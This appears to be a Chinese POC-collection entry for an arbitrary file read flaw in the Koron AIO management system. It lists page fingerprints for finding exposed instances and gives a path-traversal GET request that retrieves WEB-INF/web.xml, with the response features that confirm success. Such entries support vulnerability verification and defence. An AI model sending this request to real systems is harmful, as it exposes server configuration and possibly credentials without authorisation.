﻿# 科荣 AIO 管理系统 ReadFile 任意文件读取漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="changeAccount('8000')" || body="changeAccount(\"varAccount\")"|| body="KoronCom.TrustedSites"

> 验证脚本：HTTP

```
GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：web-app

> 上传文件定位：

> 验证文件来源：科荣 AIO 管理系统 ReadFile 任意文件读取漏洞.poc

